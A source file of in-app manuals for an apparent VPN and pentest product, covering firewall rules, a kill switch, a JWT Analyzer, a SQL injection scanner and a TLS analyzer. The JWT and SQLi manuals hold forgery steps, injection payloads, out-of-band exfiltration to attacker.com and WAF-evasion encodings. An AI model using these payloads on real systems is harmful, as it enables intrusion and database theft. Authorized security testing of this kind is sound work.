    IPs that hit 3+ lure endpoints within 60 minutes are
    auto-added to Blocked IPs with source "Ghost Trap".
    Review in Firewall → Blocked IPs.

  Ghost Trace:
    Peers with anomaly score > 90 trigger a suggested block
    of the malicious destination IP. Requires admin confirmation.

  Manual IP Investigator:
    From Ghost Trap Counter-Intel, "Add to Firewall Block"
    immediately adds the investigated IP to the blocked list.

  AbuseIPDB auto-block:
    If enabled in Threat Intel settings, IPs with confidence
    score > 90 on AbuseIPDB are automatically added.
    Settings: Threat Intel → Auto-Block Threshold.

9. EXPORTING IPTABLES RULES

  Firewall → Export tab → "Generate iptables Script"

  Downloads a .sh shell script that applies all active firewall
  rules using standard iptables commands. Use this to:
  • Apply the same rules manually on servers outside ProxhqVPN
  • Back up your firewall configuration
  • Audit exactly what rules are active in a readable format

  Example generated output:
  ---
  #!/bin/bash
  # ProxhqVPN Firewall — auto-generated $(date)

  # Default policies
  iptables -P INPUT DROP
  iptables -P FORWARD DROP
  iptables -P OUTPUT ACCEPT

  # Allow loopback
  iptables -A INPUT -i lo -j ACCEPT

  # Allow established connections
  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

  # WireGuard
  iptables -A INPUT -p udp --dport 51820 -j ACCEPT

  # SSH (rate-limited, admin IP only)
  iptables -A INPUT -s ADMIN_IP/32 -p tcp --dport 22 \
    -m limit --limit 5/min --limit-burst 10 -j ACCEPT

  # Block attacker IPs
  iptables -A INPUT -s 185.220.101.47 -j DROP

  # IPv6 — mirror all rules
  ip6tables -P INPUT DROP
  ip6tables -A INPUT -i lo -j ACCEPT
  ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
  ---

  nftables export is also available (Settings → Export Format).

10. RULE ORDERING & PRIORITY

  Rules are evaluated in priority order (lowest number = first).
  ACCEPT rules must have LOWER priority number than DROP rules
  for the same port/IP to take effect.

  Example ordering:
  Priority 1:  Allow loopback (127.0.0.1 always allowed)
  Priority 5:  Allow admin SSH (YOUR_IP:22)
  Priority 10: Allow WireGuard (51820/UDP)
  Priority 20: Allow established connections
  Priority 50: Rate limit SSH (all IPs)
  Priority 90: Block known attacker IPs
  Priority 100: Default deny all (DROP policy)

  If an ALLOW rule and a BLOCK rule conflict on the same IP+port,
  whichever has the LOWER priority number wins.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "kill-switch-manual",
    title: "Kill Switch + Auto-IP",
    subtitle: "OS-level traffic blocking on VPN drop, IPv6 protection, and auto-IP whitelisting",
    version: "1.4",
    pages: 12,
    icon: Lock,
    iconColor: "text-amber-400",
    tier: "basic",
    content: `Kill Switch — User Manual
Version 1.4 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
VPN Basic Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. What the Kill Switch Does
2. Auto-IP Whitelisting
3. IPv6 Leak Protection
4. Platform Rules (Linux / macOS / Windows)
5. Enabling the Kill Switch
6. Disabling the Kill Switch
7. Kill Switch Modes
8. Testing the Kill Switch
9. Troubleshooting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. WHAT THE KILL SWITCH DOES

  The Kill Switch blocks ALL internet traffic the instant your
  VPN tunnel drops — preventing your real IP address from being
  exposed even for a millisecond.

  Without a kill switch:
  • VPN drops (network hiccup, server restart, interface change)
  • Your OS immediately falls back to direct internet connection
  • All apps continue sending traffic with your real IP
  • Your ISP, websites, and anyone monitoring see your real IP
  • Duration: could be seconds to minutes before VPN reconnects

  With ProxhqVPN Kill Switch active:
  • VPN drops → OS firewall instantly blocks all non-VPN traffic
  • Apps get no internet access (connection refused or timeout)
  • Real IP never exposed — zero-gap protection
  • VPN reconnects → firewall automatically re-allows VPN traffic

  Implementation:
  • Linux: iptables + ip6tables (kernel-level, near-instantaneous)
  • macOS: pf (packet filter, built into all macOS versions)
  • Windows: Windows Defender Firewall (netsh advfirewall)

2. AUTO-IP WHITELISTING

  ProxhqVPN Kill Switch includes Auto-IP Whitelisting — a feature
  that prevents you from locking yourself out of your server when
  the kill switch is applied on a remote machine.

  How it works:
  1. When you open the Kill Switch page, ProxhqVPN calls
     /api/my-ip to detect your current public IP address.
  2. A green "SAFE IP AUTO-DETECTED" banner shows your IP.
  3. All generated rule scripts have this IP pre-baked in as
     an exception — your IP can always reach the server.

  If your IP changes (dynamic IP):
  • Re-open the Kill Switch page — new IP is auto-detected.
  • Regenerate rules using the new IP.
  • Re-apply the updated rules to your server.

3. IPV6 LEAK PROTECTION

  Modern devices have BOTH an IPv4 address and an IPv6 address.
  A VPN that only blocks IPv4 traffic leaves an IPv6 backdoor:
  • Attacker (or tracker) pings your IPv6 address directly
  • Your device responds with its real IPv6 address
  • Real location exposed despite VPN being active

  ProxhqVPN Kill Switch includes full IPv6 protection:
  • ip6tables rules mirror all iptables rules
  • IPv6 loopback allowed (::1)
  • IPv6 VPN interface passthrough allowed
  • ALL other IPv6 traffic: DROP policy

  Linux IPv6 kill switch rules (included in generated script):
    ip6tables -P INPUT DROP
    ip6tables -P OUTPUT DROP
    ip6tables -P FORWARD DROP
    ip6tables -A INPUT -i lo -j ACCEPT
    ip6tables -A OUTPUT -o lo -j ACCEPT
    ip6tables -A INPUT -i wg0 -j ACCEPT
    ip6tables -A OUTPUT -o wg0 -j ACCEPT

4. PLATFORM RULES

  LINUX (iptables):
  Generated as a .sh bash script.

  Key rules:
  # Block all OUTPUT not on wg0 (except VPN server IP + your safe IP)
  iptables -I OUTPUT ! -o wg0 -m mark \
    ! --mark $(wg show wg0 fwmark) \
    -m addrtype ! --dst-type LOCAL -j REJECT

  # Allow your safe IP to bypass block (remote server admin)
  iptables -I OUTPUT -s YOUR_SAFE_IP/32 -j ACCEPT

  # Allow VPN server endpoint (so WireGuard handshake works)
  iptables -I OUTPUT -d VPN_ENDPOINT_IP/32 -j ACCEPT

  # Allow loopback + LAN
  iptables -I OUTPUT -o lo -j ACCEPT
  iptables -I OUTPUT -d 192.168.0.0/16 -j ACCEPT
  iptables -I OUTPUT -d 10.0.0.0/8 -j ACCEPT

  macOS (pf):
  Generated as a pf.conf snippet.
  Apply with: sudo pfctl -f /etc/pf.conf && sudo pfctl -e

  Key rules:
  # Block all traffic by default
  block all
  # Allow VPN interface
  pass on utun0 all
  # Allow loopback
  pass on lo0 all
  # Allow to VPN server (so reconnection works)
  pass out proto udp from any to VPN_SERVER_IP port 51820
  # Allow your admin IP
  pass from YOUR_SAFE_IP to any

  Windows (netsh):
  Generated as a .bat script.
  Run as Administrator.

  Key rules:
  netsh advfirewall firewall add rule name="BlockAll" ^
    dir=out action=block
  netsh advfirewall firewall add rule name="AllowWireGuard" ^
    dir=out action=allow protocol=UDP remoteport=51820
  netsh advfirewall firewall add rule name="AllowAdminIP" ^
    dir=out action=allow remoteip=YOUR_SAFE_IP

5. ENABLING THE KILL SWITCH

  Method A — ProxhqVPN Dashboard (recommended):
  1. Navigate to Kill Switch (/kill-switch).
  2. Verify the green "SAFE IP AUTO-DETECTED" banner shows your
     correct public IP. If wrong, refresh the page.
  3. Select your platform: Linux / macOS / Windows.
  4. Click "Download Rules" to save the generated script.
  5. Run the script on your system (with appropriate privileges).
  6. Click "Enable Kill Switch" in the dashboard.
  7. Status changes to: ACTIVE (green).

  Method B — Command line (Linux):
  Download the script from the dashboard, then:
  sudo bash proxhqvpn-killswitch-enable.sh

  Verify kill switch is active:
  sudo iptables -L OUTPUT -n --line-numbers | head -20
  # You should see REJECT/DROP rules for non-wg0 traffic

6. DISABLING THE KILL SWITCH

  WARNING: Disable the kill switch only AFTER reconnecting your VPN.
  Disabling while VPN is disconnected = real IP briefly exposed.

  Method A — Dashboard:
  Kill Switch → "Disable Kill Switch" → Confirm.
  Rules are flushed. Status: INACTIVE.

  Method B — Command line (Linux):
  sudo bash proxhqvpn-killswitch-disable.sh
  # Or manually: sudo iptables -F && sudo iptables -P OUTPUT ACCEPT

  Method C — Emergency recovery (if locked out):
  If you locked yourself out:
  sudo iptables -F     # Flush all rules
  sudo iptables -P INPUT ACCEPT
  sudo iptables -P OUTPUT ACCEPT
  sudo ip6tables -F
  sudo ip6tables -P INPUT ACCEPT
  sudo ip6tables -P OUTPUT ACCEPT

7. KILL SWITCH MODES

  STRICT Mode (default):
    Blocks ALL traffic when VPN is down.
    No internet access until VPN reconnects.
    Zero IP exposure.

  SOFT Mode:
    Allows LAN traffic even when VPN is down.
    DNS, file sharing, and local services still work.
    Slight exposure risk: LAN devices can see your traffic.
    Use when working from a trusted private network.

  CUSTOM Mode:
    Define specific bypass exceptions:
    • Allow specific ports even without VPN (e.g. local 22/TCP)
    • Allow specific IP ranges without VPN
    • Set automatic disable after N minutes without VPN reconnect

8. TESTING THE KILL SWITCH

  Always test after enabling — never assume it works.

  Test 1 — Disconnect VPN and check IP:
  1. Enable kill switch.
  2. Confirm VPN is connected (check dashboard).
  3. Note your exit IP (visit https://api.ipify.org).
  4. Disconnect VPN tunnel only (keep kill switch active).
  5. Try to load any website. Should fail entirely.
  6. Check your IP again — should show nothing / connection refused.
  7. Reconnect VPN → internet returns.

  Test 2 — IPv6 leak test:
  1. Enable kill switch.
  2. Navigate to /leaks → run IPv6 leak test.
  3. Your IPv6 address should NOT appear in results.
  4. If IPv6 leaks: confirm ip6tables rules were applied.
     Run: sudo ip6tables -L OUTPUT -n | grep DROP

  Test 3 — Network interface check:
  Terminal → ip addr show
  Confirm only lo, wg0, and LAN interface exist.
  Any unexpected interface may bypass kill switch rules.

9. TROUBLESHOOTING

  "Internet works even with VPN disconnected":
  → Kill switch rules may not have been applied.
  → Re-download and re-run the script as root/Administrator.
  → Verify: sudo iptables -L OUTPUT -n | grep REJECT

  "Can't reach the VPN dashboard":
  → Your safe IP may have changed (dynamic IP).
  → Temporarily disable kill switch from local console.
  → Regenerate rules with current IP.
  → Re-apply and re-enable.

  "IPv6 still leaking":
  → ip6tables was not applied (not installed or not run).
  → Install: sudo apt install iptables (includes ip6tables).
  → Re-run the kill switch script as root.

  "macOS pf not working after reboot":
  → pf rules do not persist across reboots by default.
  → Add to /etc/pf.conf or create a LaunchDaemon plist.
  → Kill Switch → Settings → "Install Persistent pf Rules"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "jwt-analyzer-manual",
    title: "JWT Analyzer",
    subtitle: "JWT decode, algorithm confusion, alg:none, jku/x5u injection, kid injection, claim escalation",
    version: "1.3",
    pages: 16,
    icon: Lock,
    iconColor: "text-yellow-400",
    tier: "pro",
    content: `JWT Analyzer — User Manual
Version 1.3 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LEGAL NOTICE: Only test JWT tokens from applications you own
or have explicit written permission to test.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. JWT Structure Overview
2. Decode & Analyze
3. Attack 1 — alg:none
4. Attack 2 — Algorithm Confusion (RS256 → HS256)
5. Attack 3 — jku Header Injection
6. Attack 4 — x5u Header Injection
7. Attack 5 — Embedded JWK Attack
8. Attack 6 — kid SQL / Path Injection
9. Attack 7 — Claim Escalation
10. Workflow: Capture → Analyze → Attack → Replay
11. How to Capture JWTs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. JWT STRUCTURE OVERVIEW

  A JWT (JSON Web Token) has three parts separated by dots:
  HEADER.PAYLOAD.SIGNATURE

  Header (base64url decoded):
  {
    "alg": "RS256",    ← algorithm (this is what we attack)
    "typ": "JWT",
    "kid": "key-id"   ← key identifier (also attackable)
  }

  Payload (base64url decoded — the claims):
  {
    "sub": "user123",
    "role": "user",   ← privilege claim (escalation target)
    "iat": 1712345678,
    "exp": 1712432078
  }

  Signature: cryptographic proof that header+payload weren't
  modified. The attacks here either bypass signature validation
  or forge a valid signature using a different key.

2. DECODE & ANALYZE

  JWT Analyzer (/jwt-analyzer) → paste any JWT token.
  Click "Decode & Analyze".

  Analysis output:
  • Algorithm: RS256, HS256, ES256, none, etc.
  • Expiry: is the token expired? (check before testing)
  • Subject / User ID
  • All claims in human-readable format
  • Weakness flags:
      ⚠ Short HMAC secret (HS256 with secret < 16 chars)
      ⚠ Algorithm 'none' accepted
      ⚠ No expiry claim (no exp field)
      ⚠ kid field present (potential injection)
      ⚠ jku/x5u header present (potential JWKS injection)
      ⚠ High-privilege claim (role: admin, isAdmin: true)

3. ATTACK 1 — ALG:NONE

  Vulnerability: some JWT libraries check the signature ONLY if
  the algorithm is not "none". Changing alg to "none" and removing
  the signature causes them to accept the unsigned token.

  Attack:
  1. Decode the header: {"alg": "RS256", "typ": "JWT"}
  2. Modify: {"alg": "none", "typ": "JWT"}
  3. Re-encode header as base64url (no padding).
  4. Modify payload claims as desired (e.g. role → admin).
  5. Re-encode payload as base64url.
  6. Construct token: NEW_HEADER.NEW_PAYLOAD.
     (trailing dot, no signature — or empty signature)

  JWT Analyzer does this automatically:
  Forgery Attacks → alg:none → Generate Attack Token

  Detection: if the server returns 200 with modified claims
  instead of 401/403, the server is vulnerable.

4. ATTACK 2 — ALGORITHM CONFUSION (RS256 → HS256)

  Vulnerability: the server uses RS256 (asymmetric — RSA private
  key signs, public key verifies). If a library allows the client
  to specify the algorithm, you can switch to HS256 (symmetric —
  same key for signing and verification). Using the server's PUBLIC
  KEY as the HS256 HMAC secret creates a valid signature that the
  server will accept.

  Attack:
  1. Fetch the server's public key from its JWKS endpoint:
     https://target.com/.well-known/jwks.json
     (or check for /api/jwks, /oauth/jwks, /.well-known/openid-configuration)
  2. Extract the RSA public key (n and e values or PEM format).
  3. Change token header: "alg": "RS256" → "alg": "HS256"
  4. Modify payload claims.
  5. Sign with HS256 using the PUBLIC key as the HMAC secret.

  JWT Analyzer does this automatically:
  → Forgery Attacks → RS256→HS256 → enter JWKS endpoint URL
  → Analyzer fetches the key and forges the token.

5. ATTACK 3 — jku HEADER INJECTION

  Vulnerability: the jku (JWK Set URL) header tells the server
  where to fetch the signing key. If the server fetches any URL
  in the jku header without validation, you can point it to your
  own JWKS endpoint.

  Attack:
  1. Generate an RSA key pair (JWT Analyzer does this for you).
  2. Host your public key as a JWKS JSON at a URL you control
     (use the OAST Tester callback URL).
  3. Add to JWT header: "jku": "https://your-oast-server/jwks.json"
  4. Sign the token with YOUR private key.
  5. The server fetches YOUR JWKS and validates with your key.
     → You control the signing key → forge any claims.

  JWT Analyzer → Forgery Attacks → jku Injection:
  → Enter your JWKS URL (OAST Tester provides one automatically)
  → Generates the key pair, hosts it, and forges the token.

6. ATTACK 4 — x5u HEADER INJECTION

  Same concept as jku but uses x5u (X.509 certificate chain URL).
  The server fetches an X.509 certificate chain from the x5u URL
  and uses the public key from the certificate to verify the token.

  JWT Analyzer → Forgery Attacks → x5u Injection:
  → Generates a self-signed certificate, hosts it at OAST URL.
  → Forges token signed with the corresponding private key.

7. ATTACK 5 — EMBEDDED JWK ATTACK

  Vulnerability: the jwk header embeds the signing key directly
  in the JWT. Vulnerable servers use this embedded key to verify
  the signature — meaning you can sign with your own key.

  Attack:
  1. Generate RSA key pair.
  2. Add header: "jwk": { [your public JWK here] }
  3. Sign with your private key.
  4. Server reads "jwk" from header, uses it to verify → passes.

  JWT Analyzer → Forgery Attacks → Embedded JWK

8. ATTACK 6 — kid SQL / PATH INJECTION

  Vulnerability: the kid (Key ID) header value is used by some
  servers to look up the signing key in a database or file system.
  If unsanitized, SQL injection or path traversal in kid can
  control what "key" the server uses.

  Payloads (all 6 tested automatically):

  SQL Injection:
    kid: "x' UNION SELECT 'mysecret'-- -"
    → If SQL injection works, server fetches "mysecret" as key
    → Sign with HS256 using "mysecret" as the secret

  OR bypass:
    kid: "x' OR '1'='1"
    → May return first key in DB regardless of ID

  Path traversal:
    kid: "../../dev/null"
    → /dev/null = empty key → sign with empty HS256 secret

  NULL byte:
    kid: "valid-key\x00injected"
    → Null byte may truncate DB query or file lookup

  JWT Analyzer → Forgery Attacks → kid Injection:
  → Tests all 6 payloads
  → For SQL injection variants: you provide the HMAC secret
    value injected via UNION SELECT
  → For /dev/null variant: signs with empty string as secret

9. ATTACK 7 — CLAIM ESCALATION

  Not a signature attack — this tests whether the server validates
  privilege claims SERVER-SIDE or trusts the JWT payload directly.

  Claims to escalate (all modified in one shot):
    role: "user" → "admin"
    isAdmin: false → true
    scope: "read" → "admin read:all write:all"
    plan: "free" → "enterprise"
    group: "users" → "administrators"

  Attack:
  1. Take a valid token (signed correctly).
  2. Modify any privilege claim in the payload.
  3. Leave signature unchanged (will be invalid — that's the test).
  4. Submit the modified token.
  5. If the server returns 200 with elevated access:
     → Server is not verifying the signature! Critical bug.

  JWT Analyzer → Forgery Attacks → Claim Escalation.

10. WORKFLOW: CAPTURE → ANALYZE → ATTACK → REPLAY

  Step 1: Capture the JWT
    See Section 11 for how to capture JWTs.

  Step 2: Decode & Analyze
    Paste the JWT → Decode & Analyze.
    Review the weakness flags to choose which attack to try.

  Step 3: Select Attack
    Choose from the Forgery Attacks panel based on flags:
    • jku/x5u present → try jku or x5u injection first
    • kid present → try kid SQL/path injection
    • RS256 algorithm → try algorithm confusion
    • Any algorithm → try alg:none as baseline
    • High privilege claim visible → try claim escalation

  Step 4: Generate Attack Token
    Click "Generate Attack Token" for the selected attack.
    Token is displayed and auto-copied.

  Step 5: Replay
    Method A: HTTP Interceptor → intercept a request → replace
              Authorization: Bearer [original] with forged token.
    Method B: curl:
              curl -H "Authorization: Bearer FORGED_TOKEN" \
                   https://target.com/api/admin/users

  Step 6: Assess Result
    200 + admin data → critical vulnerability confirmed
    401/403 → token rejected (server validating correctly)
    500 → server error (token caused exception — investigate)

11. HOW TO CAPTURE JWTS

  From Browser DevTools:
    F12 → Network tab → filter by XHR/Fetch
    Click any API request → Headers → Authorization: Bearer [JWT]
    Or: Application tab → Local Storage / Session Storage → look
    for keys like "token", "jwt", "auth_token", "access_token"

  From HTTP Interceptor:
    Browse the target with Interceptor ON.
    Any request with Authorization: Bearer header shows
    an "Analyze JWT" button → one click to JWT Analyzer.

  From curl:
    curl -c cookies.txt -b cookies.txt -v https://target.com/login \
      --data '{"user":"test","pass":"test"}' 2>&1 | grep -i bearer

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "sqli-scanner-manual",
    title: "SQL Injection Scanner",
    subtitle: "Error-based, blind boolean, time-based, UNION, second-order, and OOB detection",
    version: "1.2",
    pages: 14,
    icon: Database,
    iconColor: "text-orange-400",
    tier: "pro",
    content: `SQL Injection Scanner — User Manual
Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LEGAL NOTICE: Only test systems you own or have explicit
written permission to test.
ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Detection Techniques
3. Configuring a Scan
4. Reading Results
5. Sending to SQLMap
6. Database-Specific Notes
7. Second-Order SQLi
8. Out-of-Band (OOB) SQLi
9. WAF Evasion Mode

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The SQL Injection Scanner (/sqli-scanner) detects SQL injection
  vulnerabilities across web application endpoints. It uses 5
  detection techniques and supports all major database engines.

  Workflow: Scanner detects → SQLMap exploits → extract data
  The Scanner is designed to quickly confirm whether SQLi exists.
  Once confirmed, send to SQLMap for full exploitation.

2. DETECTION TECHNIQUES

  ERROR-BASED:
    Injects payloads that cause the database to emit error messages
    containing internal information.

    Example payloads:
      '                     → generic syntax error
      ''                    → quote escaping test
      \` (backtick)         → MySQL-specific syntax
      1 AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--
      1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

    Detection: response body contains database error strings:
    MySQL:   "You have an error in your SQL syntax"
    MSSQL:   "Unclosed quotation mark"
    Oracle:  "ORA-01756" or "quoted string not properly terminated"
    PgSQL:   "unterminated quoted string" or "syntax error at"
    SQLite:  "unrecognized token"

  BOOLEAN BLIND:
    Sends two requests: one with a TRUE condition, one with FALSE.
    Compares response body size, status code, or content to detect
    behavioral differences.

    Example payload pairs:
    TRUE:   ?id=1 AND 1=1
    FALSE:  ?id=1 AND 1=2

    TRUE:   ?id=1' AND '1'='1
    FALSE:  ?id=1' AND '1'='2

    If response to TRUE differs from FALSE: SQLi confirmed.
    Response differences measured: body length, status code,
    specific keyword presence/absence, response time.

  TIME-BASED BLIND:
    Injects payloads that cause the database to sleep for a fixed
    period. If the response takes longer than expected: SQLi.

    Payloads by DBMS:
    MySQL:   ?id=1' AND SLEEP(5)-- -
    MSSQL:   ?id=1'; WAITFOR DELAY '0:0:5'--
    Oracle:  ?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
    PgSQL:   ?id=1'; SELECT pg_sleep(5)--
    SQLite:  ?id=1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--

    Threshold: response time > 4.5 seconds = VULNERABLE.
    Noise protection: baseline response time measured first;
    injection delay must exceed baseline by 4+ seconds.

  UNION-BASED:
    Determines column count via ORDER BY, then injects UNION SELECT
    to extract data directly in the response.

    Step 1 — Find column count:
    ?id=1 ORDER BY 1--
    ?id=1 ORDER BY 2--
    ... (increase until error = column count-1)

    Step 2 — Find displayable columns:
    ?id=-1 UNION SELECT NULL,NULL,NULL--
    ?id=-1 UNION SELECT 'a','b','c'--

    Step 3 — Extract data:
    ?id=-1 UNION SELECT version(),user(),database()--

  SECOND-ORDER:
    Stores a payload in one endpoint, triggers it in another.
    Harder to detect — requires two requests in sequence.

    Example:
    POST /register username=admin'--
    GET  /profile?user=admin'-- (triggers stored payload)

    Scanner tests this by injecting in write endpoints
    (register, update, comment) then checking read endpoints.

3. CONFIGURING A SCAN

  SQLi Scanner (/sqli-scanner) → configuration:

  Target URL:
    Full URL including any existing query parameters.
    Mark injection point with an asterisk (*):
      https://target.com/api/search?q=*&page=1
    Or leave the parameter value and let auto-detection find it.

  HTTP Method: GET / POST / PUT / DELETE

  Headers (optional):
    Add any authentication headers:
      Authorization: Bearer eyJ...
      Cookie: session=abc123
      X-API-Key: your-api-key

  Request Body (POST/PUT):
    JSON: {"search": "*", "page": 1}    ← * marks injection point
    Form: search=*&page=1

  Injection Techniques (select all by default):
    ☑ Error-based
    ☑ Boolean blind
    ☑ Time-based blind
    ☑ UNION-based
    ☑ Second-order (experimental)

  DBMS (optional — auto-detected if left blank):
    MySQL, MSSQL, PostgreSQL, Oracle, SQLite, MariaDB

  Threads: 1–10 (default 3 — parallel parameter testing)

  Delay: 0–5 seconds between requests (for rate-limited targets)

4. READING RESULTS

  Each confirmed injection shows:
  • Technique: which detection method confirmed it
  • Parameter: the vulnerable parameter name
  • Payload: the exact payload that confirmed injection
  • Evidence: the response excerpt that proved vulnerability
  • DBMS: detected database engine
  • CVSS score: severity rating

  Evidence column contents:
  Error-based:   extracted error message string from response
  Boolean blind: "Response length diff: 847 vs 203 bytes"
  Time-based:    "Response time: 5.23s (baseline: 0.12s)"
  Union-based:   "MySQL 8.0.28, root@localhost, targetdb"

5. SENDING TO SQLMAP

  Once a vulnerability is confirmed, escalate to SQLMap for full
  automated exploitation: dump databases, tables, users, passwords.

  Click "Send to SQLMap" on any confirmed finding.
  SQLMap tab opens with:
  • URL pre-filled
  • Technique flag set (--technique=E for error-based, etc.)
  • DBMS flag set (--dbms=mysql)
  • Parameter marked (--data or -p flag set)

  Then in SQLMap:
  • Click "Dump Databases" (--dbs)
  • Select a database → "Dump Tables" (-D dbname --tables)
  • Select a table → "Dump Data" (-D dbname -T tablename --dump)

6. DATABASE-SPECIFIC NOTES

  MySQL / MariaDB:
    • information_schema holds all table/column names
    • group_concat() useful for extracting multiple values
    • FILE privilege allows reading server files via LOAD_FILE()
    • INTO OUTFILE allows writing files (web shell if path known)

  MSSQL:
    • xp_cmdshell can execute OS commands (if enabled)
    • OPENROWSET for OOB data exfiltration
    • information_schema.tables or sys.tables for enumeration

  PostgreSQL:
    • pg_read_file() for file reading (superuser only)
    • COPY TO/FROM for file I/O
    • pg_sleep() for time-based

  Oracle:
    • all_tables, all_columns for enumeration
    • UTL_HTTP for OOB HTTP callback
    • DBMS_LDAP for OOB DNS lookup

  SQLite:
    • sqlite_master for schema enumeration
    • Very limited OOB capability
    • Time-based: HEX(RANDOMBLOB(N)) for delay

7. SECOND-ORDER SQLI

  Configure second-order scan:
  Write Endpoint:  URL where payload is stored (POST /register)
  Read Endpoint:   URL where payload is executed (GET /profile)
  Trigger Field:   field name in the read response that reflects stored data
  Write Body:      {"username": "INJECT_HERE", "email": "test@test.com"}

  The scanner injects in the write endpoint and polls the read
  endpoint for the SQLi confirmation signals (error, diff, delay).

8. OUT-OF-BAND (OOB) SQLI

  For blind SQLi with no response differences (both error and
  time-based fail), try OOB via the OAST Tester:

  1. Get your OAST callback URL: /oast-tester → copy DNS/HTTP URL
  2. In SQLi Scanner → Advanced → OOB Mode → paste callback URL
  3. Scanner injects DNS/HTTP callback payloads:
     MySQL:  LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\x'))
     MSSQL:  EXEC master.dbo.xp_dirtree 'YOUR_OAST_URL'
     Oracle: SELECT UTL_HTTP.REQUEST('http://YOUR_OAST_URL')
  4. Check OAST Tester for incoming DNS/HTTP hits confirming SQLi.

9. WAF EVASION MODE

  Scanner → Advanced → WAF Evasion: ON

  Applies automatic obfuscation to all payloads:
  • Inline comments: SELECT/**/version()
  • Case variation: SeLeCt VeRsIoN()
  • URL encoding: %53%45%4C%45%43%54
  • Whitespace alternatives: tab, newline, CR
  • MySQL version comments: SELECT /*!50000 version*/()
  • Double URL encoding: %2553%2545%254C%2545%2543%2554

  Also pairs with Ghost Chain WAF Bypass payloads for maximum
  evasion coverage against Cloudflare, AWS WAF, ModSecurity.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ssl-tls-manual",
    title: "SSL/TLS Analyzer",
    subtitle: "Certificate inspection, protocol versions, cipher suites, and known vuln detection",
    version: "1.1",
    pages: 12,
    icon: Lock,
    iconColor: "text-blue-300",
    tier: "pro",
    content: `SSL/TLS Analyzer — User Manual
Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Certificate Inspection
3. Protocol Version Testing
4. Cipher Suite Analysis
5. Key Exchange & Forward Secrecy
6. HTTP Security Header Check
7. Known Vulnerability Detection
8. How to Use
9. Reading the Report
10. Remediation Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

  The SSL/TLS Analyzer (/ssl-tls) performs a live TLS handshake
  analysis against any HTTPS endpoint. It tests the server's TLS
  configuration for weak protocols, insecure cipher suites, expired
  or misconfigured certificates, and known vulnerabilities.

  All scans run from the ProxhqVPN server (through your VPN tunnel).
  Useful for: bug bounty recon, security audit, compliance checking
  (PCI DSS, HIPAA, SOC 2 all require strong TLS configurations).

2. CERTIFICATE INSPECTION

  Checks:
  • Subject: CN, O, OU, C fields
  • SANs (Subject Alternative Names): all covered domains
  • Issuer: CA name (DigiCert, Let's Encrypt, Sectigo, etc.)
  • Validity: not-before and not-after dates
  • Expiry warning: flags certs expiring within 30 days
  • Key type: RSA / ECDSA / EdDSA
  • Key size: RSA <2048 = weak, RSA >=4096 = strong
  • Signature algorithm: SHA-256 / SHA-1 (SHA-1 = insecure)
  • Certificate Transparency: is it logged in CT logs?
  • OCSP stapling: is it configured?
  • Certificate chain: complete chain to root CA present?

  Common certificate findings:
  CRITICAL: Certificate expired (past not-after date)
  HIGH:     Certificate expiring in < 7 days
  HIGH:     SHA-1 signature algorithm (breakable)
  HIGH:     Self-signed certificate (no CA trust)
  MEDIUM:   Certificate expiring in 8–30 days
  MEDIUM:   RSA key < 2048 bits
  LOW:      No OCSP stapling configured

3. PROTOCOL VERSION TESTING

  The analyzer probes the server with each TLS/SSL version:

  SSLv2 (1995) — CRITICAL if accepted
    Fundamentally broken. Allows DROWN attack.
    Any server still accepting SSLv2 is severely outdated.

  SSLv3 (1996) — CRITICAL if accepted
    Broken by POODLE attack (2014). Never acceptable.

  TLS 1.0 (1999) — HIGH if accepted
    Deprecated by RFC 8996 (2021). Vulnerable to BEAST, POODLE-TLS.
    PCI DSS requires disabling TLS 1.0 since June 2018.

  TLS 1.1 (2006) — MEDIUM if accepted
    Deprecated. No known practical attacks but obsolete.
    Should be disabled in all modern deployments.

  TLS 1.2 (2008) — SHOULD be accepted
    Current baseline. Acceptable when configured with
    strong cipher suites (ECDHE + AES-GCM or ChaCha20-Poly1305).

